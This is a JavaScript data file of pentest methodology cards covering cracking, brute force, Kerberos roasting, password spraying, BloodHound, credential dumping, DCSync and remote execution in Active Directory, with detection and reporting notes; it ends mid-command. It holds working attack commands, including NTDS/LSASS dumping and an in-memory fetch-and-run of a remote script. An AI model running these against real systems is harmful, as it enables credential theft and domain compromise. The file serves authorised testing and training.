{id:'keepass-crack',wl:['hash-cracking'],lane:'cracking',title:'KeePass Database Cracking',hypothesis:'A .kdbx file found on a share or a box is a password vault — and vaults hold domain admin. The master password is the only wall. keepass2john extracts a crackable hash (hashcat mode 13400), and master passwords are chosen by the same humans who pick the weak passwords everywhere else.',prereq:{any:['loot.files','foothold.linux','foothold.windows','smb.share_access']},produces:['credential.plaintext','db.creds'],commands:[{tool:'keepass2john',run:'keepass2john {{file}} > {{hashfile}}',note:'Convert the .kdbx to a hash. If it errors about keyfiles, you need the .key file too — hunt for it on the same box.'},{tool:'hashcat',run:'hashcat -m 13400 {{hashfile}} {{wordlist}}',note:'Mode 13400. Add rules; master passwords are often phrase-like, so try combinator attacks too.'},{tool:'kpcli',run:'kpcli --kdb={{file}}',note:'Once cracked, browse the vault interactively and dump EVERYTHING — notes fields hold flags and hints.'}],expected:['$keepass$','Cracked'],onFailure:{'Exhausted':{note:'Bigger wordlist + rules, cewl from the target environment, or a keyfile-based unlock instead of password.'}},defender:'Offline operation; no detection. The theft of the .kdbx itself is what logs.',report:{finding:'KeePass Vault with Crackable Master Password',severity:'critical'},tools:['keepass2john','hashcat','kpcli'],refs:['https://github.com/openwall/john']},

{id:'file-to-hash',wl:['hash-cracking'],lane:'cracking',title:'The *2john Family (Files to Crackable Hashes)',hypothesis:'Encrypted archives, private keys, and certificates all convert to crackable hashes with the *2john tools. This is the single most repeated cracking pattern in the 0xdf corpus: find encrypted file → convert → john/hashcat → password → open the file → new credentials.',prereq:{any:['loot.files','foothold.linux','foothold.windows','smb.share_access']},produces:['hash.identified','credential.plaintext'],commands:[{tool:'sh',run:'zip2john {{file}} > {{hashfile}}',note:'Encrypted zips. rar2john for .rar, 7z2john for .7z.'},{tool:'sh',run:'ssh2john.py {{file}} > {{hashfile}}',note:'Password-protected SSH private keys (id_rsa). hashcat cannot crack these — john only.'},{tool:'sh',run:'pfx2john.py {{file}} > {{hashfile}}',note:'PKCS#12 certificate bundles (.pfx/.p12) — the timelapse pattern: crack the pfx, extract the cert, WinRM in with the key. office2john and pdf2john cover docs.'}],expected:['$zip2$','$sshng$','$pfx$'],onFailure:{'not encrypted':{note:'The file is not password-protected — just open it. Conversion tools erroring can also mean wrong format; run file(1) first.'}},defender:'Offline; invisible.',report:{finding:'Crackable Protected File Recovered',severity:'high'},tools:['zip2john','ssh2john','rar2john','pfx2john','office2john','john','hashcat'],refs:['https://github.com/openwall/john']},

{id:'john-modes',wl:['hash-cracking'],lane:'cracking',title:'John the Ripper (When hashcat Won\'t)',hypothesis:'hashcat is the default, but john covers formats hashcat lacks (SSH keys!) and its --rules engine and incremental mode are excellent. Corpus habit: john --wordlist=rockyou for the first pass, escalate to --rules or --incremental after. Always check john --list=formats when a hash type is unclear.',prereq:{any:['hash.identified']},produces:['credential.plaintext'],commands:[{tool:'john',run:'john --wordlist=/usr/share/wordlists/rockyou.txt {{hashfile}}',note:'Default first pass. john auto-detects format from the hash.'},{tool:'john',run:'john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt {{hashfile}}',note:'Force a format when auto-detect picks wrong. john --list=formats | grep -i <name> to find the name.'},{tool:'john',run:'john --show {{hashfile}}',note:'Show cracked results. (hashcat equivalent: --show as well.)'}],expected:['password','cracked'],onFailure:{'No password hashes loaded':{note:'Format not recognized — try --list=formats to find it, or convert with the right *2john first (see file-to-hash).'}},defender:'Offline; invisible.',report:{finding:'Credentials Recovered via Offline Cracking',severity:'high'},tools:['john'],refs:['https://github.com/openwall/john']},

{id:'online-brute',wl:['passwords','default-creds'],lane:'cracking',title:'Online Brute Force (hydra)',hypothesis:'When enumeration stalls, online brute force against SSH/FTP/RDP/HTTP is the blunt instrument — effective but loud and lockout-prone. Rules: prefer spraying (few passwords × many users) over brute-forcing one account; always test for lockout policy first with your own known-bad attempts; hydra syntax is notoriously finicky, so test your exact command against a known-good credential first.',prereq:{any:['ssh.reachable','ftp.reachable','rdp.reachable','web.reachable','smb.reachable']},produces:['credential.available'],commands:[{tool:'hydra',run:'hydra -l {{user}} -P {{wordlist}} ssh://{{target}} -t 4',note:'One user, password list, SSH. -t 4 threads keeps it sane. Swap ssh:// for ftp://, rdp://, smb.'},{tool:'hydra',run:"hydra -L {{userlist}} -p '{{password}}' {{target}} smb",note:'Spray pattern: one password, many users — the lockout-safe direction. nxc does this too (see password-spray).'},{tool:'hydra',run:"hydra -l {{user}} -P {{wordlist}} {{target}} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'",note:'Web form attack: path : field names : FAILURE string. The failure string is the part everyone gets wrong — grab it from a real failed login response. Use ^USER64^/^PASS64^ if the form base64s values.'},{tool:'medusa',run:'medusa -h {{target}} -U {{userlist}} -P {{wordlist}} -M ssh',note:'medusa is the hydra alternative — some operators find its module syntax (-M ssh / -M http -m GET, -H hosts.txt for multiple targets) cleaner. Same lockout rules apply.'}],expected:['login:','password:'],onFailure:{'0 valid passwords':{note:'Verify the failure string and field names from an actual browser attempt. Check lockout: did YOUR test account get locked? Then stop spraying.'},'does not support':{note:'Service module mismatch — hydra -U ssh shows module options; some services need -s for nonstandard ports.'}},defender:'Maximally loud: failed-login floods in every auth log, account lockouts, IDS signatures. Assume you are seen.',report:{finding:'Weak Credentials via Online Brute Force',severity:'high'},tools:['hydra','medusa'],os:['linux','windows'],refs:['https://github.com/vanhauser-thc/thc-hydra','https://github.com/jmk-foofus/medusa']}
]}
];

// Active Directory lane
window.OBOL_LANES.push({ lane:'ad', phase:'Active Directory', title:'Active Directory', version:0.1, cards:[

{id:'ad-dc-identify',lane:'ad',title:'Identify the Domain Controller and Domain',hypothesis:'A domain controller has a recognizable service fingerprint: Kerberos (88), LDAP (389/636), SMB (445), often DNS (53) and global catalog (3268). Before any AD technique works you need three facts: which host is the DC, the domain name, and the base DN. SMB banners disclose the domain with zero authentication.',prereq:{any:['port:88','port:389','port:445']},produces:['ad.dc_candidate','ad.domain_known','kerberos.reachable','ldap.reachable','smb.reachable'],commands:[{tool:'nxc',run:'nxc smb {{target}}',note:'The banner line discloses domain and hostname, unauthenticated.'},{tool:'nslookup',run:'nslookup -type=SRV _ldap._tcp.dc._msdcs.{{domain}}',note:'SRV records confirm which host is a DC. Skip if no domain known yet.'},{tool:'nmap',run:'nmap -p 88,135,139,389,445,636,3268,5985 -sV {{target}}',note:'The DC-shaped port combination. 88+389+445 together is near-certain.'}],expected:['(domain:','Windows','kerberos'],onFailure:{'Note: Host seems down':{note:'Add -Pn; DCs often block ICMP.'}},defender:'Indistinguishable from normal client behavior; heavy port sweeps show in any IDS.',report:{finding:'Domain Controller Identified',severity:'informational'},tools:['nxc','nslookup','nmap'],os:['windows']},

{id:'ad-anon-ldap-enum',lane:'ad',title:'Anonymous LDAP Enumeration',hypothesis:'Many lab DCs allow anonymous LDAP binds. An anonymous bind can expose the base DN and sometimes the entire user and group directory — including description fields, which admins notoriously use to store passwords and hints. Highest-value zero-credential move against a DC.',prereq:{any:['ldap.reachable','port:389']},produces:['ad.base_dn','ad.user_list','ad.anonymous_bind'],commands:[{tool:'nxc',run:'nxc ldap {{target}} -u \'\' -p \'\' --users',note:'nxc does the whole anonymous LDAP pull in one line — users with descriptions included. On Forest-style boxes this is the fastest user list you will ever get.',opts:[{flag:'--users',tip:'all user objects incl. descriptions'},{flag:'--groups',tip:'domain groups'},{flag:'--dc-list',tip:'list domain controllers'},{flag:'--get-desc-users',tip:'users whose description contains keywords (password hints hide here)'}]},{tool:'ldapsearch',run:"ldapsearch -x -H ldap://{{target}} -s base namingcontexts",note:'Anonymous bind test. If this returns naming contexts, the bind is allowed.'},{tool:'ldapsearch',run:"ldapsearch -x -H ldap://{{target}} -b '{{base_dn}}' '(objectClass=user)' sAMAccountName description",note:'Pull usernames AND descriptions. Read every description — lab authors hide things there.'},{tool:'ldapsearch',run:"ldapsearch -x -H ldap://{{target}} -b '{{base_dn}}' '(objectClass=group)' cn member",note:'Group membership reveals admin and service accounts worth targeting later.'},{tool:'windapsearch',run:"windapsearch.py -d {{domain}} --dc-ip {{target}} -U",note:'Friendlier wrapper: -U dumps all user objects with their UPNs (mail-style names reveal the naming convention). Anonymous bind attempted automatically when no creds are given.'},{tool:'windapsearch',run:"windapsearch.py -d {{domain}} --dc-ip {{target}} --custom 'objectClass=*'",note:'Dump EVERY object — OUs, groups, computers, service accounts. Service-account names (svc-*) are AS-REP-roast candidates; Exchange security groups in the output tell you Exchange is installed (see writedacl-dcsync).'}],expected:['namingcontexts','DC=','sAMAccountName'],onFailure:{'Strong(er) authentication required':{note:'Anonymous bind refused. Get a user list via Kerberos or SMB null session instead.',card:'ad-user-enum'},"Can't contact LDAP server":{note:'Check it is not LDAPS-only (636); try ldaps:// or -ZZ for StartTLS.'}},defender:'Anonymous binds and expensive queries log in Directory Service events (1644).',report:{finding:'Anonymous LDAP Bind Permitted',severity:'medium'},tools:['ldapsearch','nxc','windapsearch'],os:['windows'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html']},

{id:'ad-user-enum',wl:['usernames'],lane:'ad',title:'User Enumeration (Kerberos and RPC)',hypothesis:'Kerberos is a username oracle: the KDC answers differently for valid and invalid accounts. Null SMB sessions can also enumerate users via RPC on permissive DCs. A validated user list is the raw material for AS-REP roasting, Kerberoasting, and spraying — most AD attacks start here.',prereq:{any:['kerberos.reachable','smb.reachable','port:88','port:445']},produces:['ad.user_list'],commands:[{tool:'nxc',run:'nxc smb {{target}} -u guest -p \'\' --rid-brute',note:'RID cycling through a null/guest session — full user list with no creds and no Kerberos noise. Try guest first, then \'\' \'\'.'},{tool:'kerbrute',run:'kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}}',note:'Fast and relatively quiet. Valid users return no error or a pre-auth demand.'},{tool:'enum4linux',run:'enum4linux -U {{target}}',note:'Null-session RPC user enumeration.'},{tool:'rpcclient',run:"rpcclient -U '' -N {{target}} -c 'enumdomusers'",note:'Manual null-session equivalent.'}],expected:['user:','VALID','sAMAccountName'],onFailure:{'KDC_ERR_C_PRINCIPAL_UNKNOWN':{note:'Every guess invalid — your wordlist does not match their naming scheme. Mine web content and email addresses for the convention, or get LDAP access first.',card:'ad-anon-ldap-enum'},'NT_STATUS_ACCESS_DENIED':{note:'Null sessions disabled. Find a credential another way and come back.',card:'gpp-passwords'}},defender:'Bursts of 4768 pre-auth failures from one source; SAMR enumeration in logs.',report:{finding:'Domain User Enumeration Without Credentials',severity:'low'},tools:['kerbrute','enum4linux','rpcclient','nxc'],os:['windows'],refs:['https://github.com/ropnop/kerbrute']},

{id:'asrep-roast',wl:['hash-cracking'],lane:'ad',title:'AS-REP Roasting',variants:[{id:'kali',name:'From Kali (GetNPUsers)',summary:'Zero creds needed — just a user list. The classic anonymous first move when Kerberos is reachable.'},{id:'win',name:'From Windows (Rubeus)',summary:'Rubeus finds and roasts vulnerable accounts itself from a domain beachhead — no user list needed, but requires a Windows foothold and an upload.'}],hypothesis:'Accounts with DONT_REQUIRE_PREAUTH skip Kerberos pre-authentication: anyone can request an AS-REP, and part of the reply is encrypted with the account password hash. Request it, take it offline, crack it. No credentials needed — only a valid username. One weak password on one misconfigured account is a foothold.',prereq:{all:['ad.user_list'],any:['kerberos.reachable','port:88']},produces:['hash.asrep','credential.candidate'],commands:[{tool:'nxc',v:'kali',run:'nxc ldap {{target}} -u {{userlist}} -p \'\' --asreproast {{hashfile}}',note:'PREFERRED: zero creds — every user in the list is tried, roastable ones land in {{hashfile}} ready for hashcat -m 18200. This is the fastest Forest-style entry: anonymous LDAP gave you the list, this cashes it in.'},{tool:'Rubeus',v:'win',run:'.\\Rubeus.exe asreproast /format:hashcat /outfile:{{hashfile}}',note:'Enumerates DONT_REQUIRE_PREAUTH accounts and roasts them in one shot. /format:john also works.'},{tool:'impacket-GetNPUsers',v:'kali',run:'impacket-GetNPUsers {{domain}}/ -usersfile {{userlist}} -dc-ip {{target}} -no-pass -outputfile {{hashfile}}',note:'Bulk roast: every pre-auth-disabled account in your user list yields a $krb5asrep$23$ hash.'},{tool:'impacket-GetNPUsers',v:'kali',run:'impacket-GetNPUsers {{domain}}/{{user}} -dc-ip {{target}} -no-pass',note:'Single-user variant — when enum already fingered one suspect service account (svc-*), skip the list. Prints the hash to stdout; save it to {{hashfile}}.'},{tool:'hashcat',run:'hashcat -m 18200 {{hashfile}} {{wordlist}}',note:'Mode 18200. Run locally; rockyou + best64 rules is the usual lab answer.'},{tool:'john',run:'john {{hashfile}} --fork=4 -w={{wordlist}}',note:'John detects krb5asrep automatically — the zero-mode-lookup path. john {{hashfile}} --show to review.'}],expected:['$krb5asrep$23$'],onFailure:{'KDC_ERR_C_PRINCIPAL_UNKNOWN':{note:'Bad usernames — tighten enumeration.',card:'ad-user-enum'},'no hashes':{note:'No pre-auth-disabled accounts. With any credential, Kerberoast instead.',card:'kerberoast'},'Exhausted':{note:'Wordlist done. Add rules, a bigger list, or cewl words from the target web content.',card:'cewl-wordlist'}},defender:'Event 4768 with no pre-auth and encryption 0x17 (RC4), in bursts from one source.',report:{finding:'AS-REP Roastable Accounts (DONT_REQUIRE_PREAUTH)',severity:'medium'},tools:['impacket-GetNPUsers','hashcat','Rubeus'],os:['windows'],refs:['https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html','https://github.com/fortra/impacket']},

{id:'gpp-passwords',lane:'ad',title:'GPP Passwords in SYSVOL',hypothesis:'Legacy Group Policy Preferences stored local-account passwords in XML files in SYSVOL — a share any domain user (and sometimes anonymous sessions) can read. The cpassword value is AES-encrypted with a key Microsoft published in 2012, making it effectively plaintext. SYSVOL often also holds scripts and configs with other secrets.',prereq:{any:['smb.reachable','port:445']},produces:['credential.candidate','config.review'],commands:[{tool:'smbclient',run:"smbclient '//{{target}}/SYSVOL' -N -c 'recurse; ls'",note:'Anonymous SYSVOL listing. Hunt for Groups.xml, ScheduledTasks.xml, Services.xml under Policies.'},{tool:'gpp-decrypt',run:'gpp-decrypt {{hash}}',note:'Paste the cpassword value as the parameter. The published AES key makes this instant.'}],expected:['cpassword','Groups.xml'],onFailure:{'NT_STATUS_ACCESS_DENIED':{note:'SYSVOL needs auth here. Any domain credential unlocks it — revisit after your first cred.',card:'ad-user-enum'},'tree connect failed':{note:'Check what anonymous SMB can see at all.',card:'smb-anon-enum'}},defender:'Fix is KB2962486; detection is anonymous SMB reads of SYSVOL policy files.',report:{finding:'Credentials Recoverable from SYSVOL Group Policy Preferences',severity:'high'},tools:['smbclient','gpp-decrypt','smbmap'],os:['windows']},

{id:'kerberoast',wl:['hash-cracking'],lane:'ad',title:'Kerberoasting',variants:[{id:'kali',name:'From Kali (impacket)',summary:'Remote roasting with creds — nothing touches target disk. targetedKerberoast even roasts an account with no SPN when you have write access to it.'},{id:'win',name:'From Windows (Rubeus)',summary:'Run Rubeus on a domain beachhead with your current logon context — no creds on the command line. Needs an upload (or execute-assembly), and Rubeus is signatured.'}],hypothesis:'Any domain user can request service tickets (TGS) for accounts with SPNs — typically service accounts — and the ticket is encrypted with the service account password hash. Request them all, crack offline. Service accounts often have weak passwords and excessive rights, which is why this is the classic first move after any domain credential.',prereq:{all:['credential.available'],any:['kerberos.reachable','port:88']},produces:['hash.tgs','credential.candidate'],commands:[{tool:'nxc',v:'kali',run:'nxc ldap {{target}} -u {{user}} -p \'{{password}}\' --kerberoasting {{hashfile}}',note:'PREFERRED: one line roasts every SPN account straight to a hashcat-13100-formatted file. -H {{hash}} works if you only have the NTLM.'},{tool:'Rubeus',v:'win',run:'.\\Rubeus.exe kerberoast /outfile:{{hashfile}}',note:'Roasts every SPN account using your current session — no password on the command line. Exfil {{hashfile}} and crack with the hashcat line.'},{tool:'impacket-GetUserSPNs',v:'kali',run:"impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{target}} -request -outputfile {{hashfile}}",note:'Requests tickets for every SPN-bearing account; crackable ones come back as $krb5tgs$23$.'},{tool:'hashcat',run:'hashcat -m 13100 {{hashfile}} {{wordlist}}',note:'Mode 13100. Service-account passwords are often old and weak.'},{tool:'targetedKerberoast',v:'kali',run:"targetedKerberoast.py -d {{domain}} -u {{user}} -p {{password}} --dc-ip {{target}}",note:'0xdf favorite for privilege escalation: roasts only accounts YOU can write to (GenericAll/GenericWrite), sets a temporary SPN, requests the ticket, then cleans up. No pre-existing SPN needed.'}],expected:['$krb5tgs$23$'],onFailure:{'no SPNs found':{note:'Rare in labs; verify your credential is a domain account and the DC is right.'},'Exhausted':{note:'Escalate wordlist/rules; service accounts sometimes use environment words — build a cewl list.',card:'cewl-wordlist'}},defender:'Event 4769 TGS requests with RC4 (0x17) in bursts; honeypot SPN accounts catch this reliably.',report:{finding:'Kerberoastable Service Accounts',severity:'medium'},tools:['impacket-GetUserSPNs','targetedKerberoast','hashcat','Rubeus'],os:['windows'],refs:['https://github.com/fortra/impacket','https://github.com/GhostPack/Rubeus','https://github.com/ShutdownRepo/targetedKerberoast']},

{id:'password-spray',wl:['passwords'],lane:'ad',title:'Password Spraying (Careful)',hypothesis:'Spraying tries ONE password against MANY accounts — the inverse of brute force, designed to stay under lockout thresholds. Seasonal passwords (Summer2026!), company name variants, and Password1 catch accounts everywhere. But lockout policies are real: check the policy first, budget your attempts, and go slow.',prereq:{all:['ad.user_list']},produces:['credential.available'],commands:[{tool:'nxc',run:"nxc smb {{target}} -u '' -p '' --pass-pol",note:'Get the lockout policy BEFORE spraying. Lockout threshold minus one is your per-window budget.'},{tool:'nxc',run:'nxc smb {{target}} -u {{userlist}} -p {{password}}',note:'One password, all users — nxc dedups targets and resumes cleanly. Wait out the observation window between passwords.',opts:[{flag:'--continue-on-success',tip:'keep spraying after a hit (default stops per target)'},{flag:'--no-bruteforce',tip:'1:1 mode — user[i] with pass[i] from paired files, zero lockout risk'},{flag:'--local-auth',tip:'spray local accounts instead of domain'}]},{tool:'sprayhound',run:'sprayhound -U {{userlist}} -d {{domain}} -dc {{target}}',note:'Kerberos-based spray; integrates with BloodHound data.'},{tool:'powershell',run:'Import-Module .\\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue',note:'From a Windows foothold instead of Kali: DomainPasswordSpray (dafthack). It auto-builds the user list from AD, skips accounts near lockout, and writes hits to a file. Change Welcome1 to your candidate.'}],expected:['[+]','STATUS_SUCCESS'],onFailure:{'STATUS_ACCOUNT_LOCKED_OUT':{note:'STOP. You hit the lockout threshold. Wait the full observation window before any further attempts.'},'all logon failures':{note:'Password not in use. Try 2-3 more high-probability candidates across long windows, then move on — spraying is a numbers game with a hard budget.'}},defender:'Event 4625 bursts across many accounts from one source; the textbook detection.',report:{finding:'Weak Domain Password (Password Spray)',severity:'high'},tools:['nxc','sprayhound'],os:['windows'],refs:['https://github.com/netexec-community/nxc','https://github.com/ropnop/kerbrute']},

{id:'bloodhound-collect',lane:'ad',title:'BloodHound Collection & Analysis',variants:[{id:'nxc',name:'nxc --bloodhound (preferred)',summary:'NetExec runs the BloodHound collector over LDAP with one flag — the fastest path when you already have creds, and it fits every nxc workflow you are already running. Ingest the zips into BloodHound CE, or drop them straight into Obol (Boxes → Ingest BloodHound) for instant findings.'},{id:'remote',name:'bloodhound-python (Kali)',summary:'Collect over the network with just creds — nothing lands on target disk. No live-session data, but the safest first pass and impossible for AV to eat.'},{id:'exe',name:'SharpHound (on target)',summary:'Run the SharpHound collector from a domain beachhead, uploaded or in-memory. Richest collection — sessions, ACLs, trusts — but touches a host and is signatured by AV.'},{id:'manual',name:'Manual PowerShell (no BloodHound)',summary:'No collector, no GUI, no upload: answer the same questions directly with net.exe + PowerView. Quiet and fast for targeted questions (who is in group X, what rights does user Y hold) — enough to finish boxes like Forest without any graph at all.'}],hypothesis:'AD environments are graphs: users, groups, sessions, ACLs, delegation. A graph maps attack paths no manual browsing would reveal — but every edge in that graph is also answerable with direct LDAP queries, which is the fallback when you cannot or will not run a collector.',prereq:{all:['credential.available']},produces:['ad.graph.collected','ad.attack_paths'],commands:[{tool:'nxc',v:'nxc',run:'nxc ldap {{target}} -u {{user}} -p \'{{password}}\' --bloodhound -c All --dns-server {{target}}',note:'Collects everything and writes BloodHound-ready zips. Through a SOCKS tunnel add --dns-tcp. Then: ingest into BloodHound CE for the graph, or Boxes → Ingest BloodHound here for an instant findings readout.'},{tool:'bloodhound-python',v:'remote',run:"bloodhound-python -d {{domain}} -u {{user}} -p '{{password}}' -ns {{target}} -c All --zip",note:'Full remote collection. Output zips are your evidence — ingest into BloodHound CE.'},{tool:'bloodhound',v:'remote',run:'bloodhound',note:'Start the GUI, import the zips, and run: Shortest Paths to Domain Admins, plus the Kerberoastable and AS-REP roastable built-ins.'},{tool:'SharpHound',v:'exe',run:'SharpHound.exe -c All --zipfilename bhloot',note:'From a domain beachhead (upload, or in-memory: IEX(DownloadString(.../SharpHound.ps1)); Invoke-BloodHound -CollectionMethod All). Exfil the zip and ingest into BloodHound on kali.'},{tool:'bloodhound',v:'exe',run:'bloodhound',note:'Same GUI workflow as the remote variant — import the zip and read the prebuilt queries.'},{tool:'net',v:'manual',run:'net user {{user}} /domain',note:'Direct group memberships of your user. And: net group "Exchange Windows Permissions" /domain lists members of any interesting group — swap the name.'},{tool:'powerview',v:'manual',run:'Get-NetGroup -UserName {{user}}',note:'Upload PowerView.ps1 and dot-source it first (. .\\PowerView.ps1). This gives ALL groups the user belongs to, including nested — the answer the graph would give.'},{tool:'powerview',v:'manual',run:'Get-DomainGroupMember "Exchange Windows Permissions" -Recurse',note:'Recursive member listing of any target group.'},{tool:'powerview',v:'manual',run:'Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser {{user}}).objectsid}',note:'Every ACE your user holds. WriteDacl/GenericAll/WriteOwner on the domain object is the DCSync path — see the writedacl-dcsync card.'},{tool:'powerview',v:'manual',run:'Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}',note:'The reverse question: who can already take over Domain Admins.'},{tool:'powerview',v:'manual',run:'Find-LocalAdminAccess',note:'Machines where your user already has local admin — lateral movement targets without a session graph.'}],expected:['.zip (collector variants)','WriteDacl (manual variant)'],onFailure:{'LDAP bind errors':{note:'Cred invalid or expired — re-validate. Check your /etc/hosts resolves the DC FQDN.'},'AV ate SharpHound':{note:'Expected — it is signatured everywhere. Switch variant: bloodhound-python from kali, or the manual PowerShell path.'}},defender:'Full collection is loud: massive LDAP query volume and session enumeration. Manual targeted queries blend with normal admin traffic.',report:{finding:'Active Directory Attack Paths Identified',severity:'high'},tools:['bloodhound-python','bloodhound','SharpHound','powerview','nxc'],os:['windows'],refs:['https://github.com/SpecterOps/BloodHound','https://github.com/dirkjanm/BloodHound.py','https://github.com/SpecterOps/SharpHound','https://github.com/PowerShellMafia/PowerSploit']},
{id:'dump-secrets',lane:'ad',title:'Credential Dumping (Local and Domain)',variants:[{id:'nxc',name:'nxc from Kali (preferred)',summary:'One line per dump, straight from Kali with admin creds or a hash — no upload, no interactive session. --ntds on a DC pulls the whole domain via DRSUAPI.'},{id:'impacket',name:'impacket secretsdump',summary:'The classic all-in-one: SAM/LSA/cached/NTDS with more knobs (offline hive parsing, single-user pulls). Slightly more typing than nxc.'},{id:'win',name:'Windows (mimikatz)',summary:'On-box extraction with mimikatz — for when you already live on the host. Last resort: LSASS access is the most signatured move in Windows.'}],hypothesis:'Admin access to a Windows host means its secrets: local SAM hashes, LSASS memory creds, cached logons. Admin access to a DC means the domain: NTDS.dit with every account hash. secretsdump does both — remotely over SMB with admin creds, or offline from extracted files.',prereq:{any:['access.admin','credential.admin']},produces:['hash.ntlm','credential.candidate','loot.ntds'],commands:[{tool:'nxc',v:'nxc',run:'nxc smb {{target}} -u {{user}} -p \'{{password}}\' --sam --lsa',note:'Local SAM hashes + LSA secrets (service passwords, cached creds) in one shot. -H {{hash}} for pass-the-hash. Point {{target}} at a subnet or targets file to loot every host at once — this is where nxc beats everything.'},{tool:'nxc',v:'nxc',run:'nxc smb {{target}} -u {{user}} -p \'{{password}}\' --ntds',note:'ON A DC: the entire domain (every hash incl. krbtgt) via DRSUAPI — one line, no mimikatz. --ntds vss uses a shadow-copy snapshot instead if replication traffic is watched.'},{tool:'mimikatz',v:'win',run:'privilege::debug',note:'Elevate first, always.'},{tool:'mimikatz',v:'win',run:'sekurlsa::logonpasswords',note:'LSASS memory: plaintext + hashes for logged-on sessions. lsadump::sam for the local SAM instead.'},{tool:'impacket-secretsdump',v:'impacket',run:"impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'Remote dump of SAM/LSA/cached creds. Requires local admin on the target.'},{tool:'impacket-secretsdump',v:'impacket',run:'impacket-secretsdump -sam SAM -system SYSTEM LOCAL',note:'Offline parse if you exfiltrated the registry hives instead.'},{tool:'impacket-secretsdump',v:'impacket',run:"impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",note:'On a DC: pull one account from NTDS rather than the whole database.'}],expected:[':::', 'Administrator:500'],onFailure:{'STATUS_ACCESS_DENIED':{note:'Not local admin on that host, or LSA protection is on. Re-verify your privileges first.'}},defender:'DCSync-style replication requests from non-DCs (Event 4662 with replication GUIDs) are a high-fidelity alert.',report:{finding:'Domain Credential Dump',severity:'critical'},tools:['impacket-secretsdump','nxc','mimikatz'],os:['windows'],refs:['https://github.com/fortra/impacket']},

{id:'dcsync',lane:'ad',title:'DCSync',variants:[{id:'kali',name:'From Kali (secretsdump)',summary:'Remote DRSUAPI replication straight from Kali — nothing uploaded. Pull one account or the whole domain.'},{id:'win',name:'From Windows (mimikatz)',summary:'lsadump::dcsync from a Windows beachhead — right call when you are already on a domain box with mimikatz loaded and creds should not transit to Kali.'}],hypothesis:'Accounts with replication rights (GetChanges + GetChangesAll — Domain Admins, and accounts granted them via ACL abuse) can ask a DC to replicate password data, no login to the DC required. This is the endgame for most AD paths: abuse ACLs to grant replication rights, then sync.',prereq:{any:['access.admin','ad.control_paths','credential.admin']},produces:['loot.ntds','hash.krbtgt'],commands:[{tool:'nxc',v:'kali',run:'nxc smb {{target}} -u {{user}} -p \'{{password}}\' --ntds',note:'PREFERRED cash-in: nxc runs the same DRSUAPI replication with a fraction of the typing. Add --ntds vss for the shadow-copy method. krbtgt in the output = golden-ticket material.'},{tool:'mimikatz',v:'win',run:'lsadump::dcsync /domain:{{domain}} /user:{{domain}}\\administrator',note:'Replicates one account from a Windows session. /all instead of /user for the full database. The mimikatz session must run as the rights-holding user (pth-spawned shell or token impersonation).'},{tool:'impacket-secretsdump',v:'kali',run:"impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",note:'Replication-based pull of a single account.'},{tool:'impacket-secretsdump',v:'kali',run:"impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'Full sync: every hash in the domain, including krbtgt (golden ticket material). Keep this file safe; it IS the report evidence.'}],expected:['krbtgt:','Administrator:500'],onFailure:{'rpc_s_access_denied':{note:'Your account lacks replication rights. Check BloodHound for an ACL path to grant them (GenericAll/WriteDacl on the domain object).',card:'bloodhound-collect'}},defender:'Event 4662 with replication GUIDs from a non-DC account is near-certain detection in mature SOCs.',report:{finding:'Domain Replication Rights Abuse (DCSync)',severity:'critical'},tools:['impacket-secretsdump','mimikatz','nxc'],os:['windows'],refs:['https://github.com/gentilkiwi/mimikatz','https://github.com/fortra/impacket']},

{id:'lateral-exec',lane:'ad',title:'Authenticated Remote Execution',variants:[{id:'nxc',name:'nxc — run without logging in (preferred)',summary:'Execute commands on one host or a whole subnet straight from Kali — no shell, no upload, no interactive login. You get output back, not a session; perfect for verification, mass looting, and quick pivots. Pwn3d! in output = local admin confirmed.'},{id:'winrm',name:'WinRM (evil-winrm)',summary:'Best interactive experience: full PowerShell session with built-in upload/download. Needs 5985/5986 open (default on Server 2016+) and Remote Management Users membership.'},{id:'psexec',name:'PsExec (service-based)',summary:'The reliable classic: drops a service binary and starts it for a SYSTEM shell. Loud (Event 7045) but works nearly everywhere SMB + local admin do.'},{id:'wmi',name:'WMI (wmiexec)',summary:'Semi-interactive shell via WMI — no service created, no binary on disk. Quieter than psexec; output returns through a temp file over SMB.'},{id:'win',name:'From Windows (native)',summary:'Already on a Windows beachhead? No uploads at all: Enter-PSSession or Sysinternals PsExec ride your current or hash-injected identity.'}],hypothesis:'Valid credentials with local admin rights give you execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM via evil-winrm (full shell, port 5985). With only an NTLM hash, pass-the-hash works the same — you rarely need the plaintext at all.',prereq:{any:['credential.available','hash.ntlm']},produces:['foothold.windows','access.admin'],commands:[{tool:'nxc',v:'nxc',run:'nxc smb {{target}} -u {{user}} -p \'{{password}}\'',note:'First: validate the cred and see what is pwned. Swap {{target}} for a subnet (10.10.11.0/24) or a targets file to check EVERY host at once — [+] means valid, Pwn3d! means local admin.',opts:[{flag:'--local-auth',tip:'local (non-domain) accounts'},{flag:'--shares',tip:'also list readable shares per host'}]},{tool:'nxc',v:'nxc',run:'nxc smb {{target}} -u {{user}} -p \'{{password}}\' -x \'whoami\'',note:'Run any command WITHOUT logging in — execution via WMI by default (no service dropped). Chain what you need: dump files, add users, stage payloads.',opts:[{arg:'-x',label:'cmd to run',placeholder:'whoami /all'},{arg:'-X',label:'powershell instead',placeholder:'Get-ChildItem C:\\Users'},{flag:'--local-auth',tip:'local accounts'},{flag:'--exec-method atexec',tip:'via Task Scheduler if WMI is blocked'},{flag:'--exec-method smbexec',tip:'service-based fallback'}]},{tool:'nxc',v:'nxc',run:'nxc winrm {{target}} -u {{user}} -p 